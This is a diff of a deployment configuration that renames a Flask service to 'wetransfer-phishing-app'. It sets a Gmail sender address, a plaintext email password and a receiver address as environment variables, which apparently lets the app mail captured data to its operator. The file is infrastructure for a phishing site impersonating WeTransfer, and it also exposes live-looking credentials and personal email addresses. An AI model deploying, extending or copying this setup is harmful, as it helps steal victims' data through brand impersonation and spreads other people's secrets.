@@ -1,6 +1,6 @@
 services:
   - type: web
-    name: flask-app
+    name: wetransfer-phishing-app
     env: docker
     dockerfilePath: Dockerfile
     buildCommand: ""
@@ -9,6 +9,8 @@ services:
       - key: EMAIL_SENDER
         value: nwekee125@gmail.com
       - key: EMAIL_PASSWORD
-        value: wkxefsuonoulinca
+        value: mhhihywubresapns
       - key: EMAIL_RECEIVER
-        value:  maxwell202201@gmail.com
+        value: nwekee125@gmail.com
+      - key: PORT
+        value: "5000"
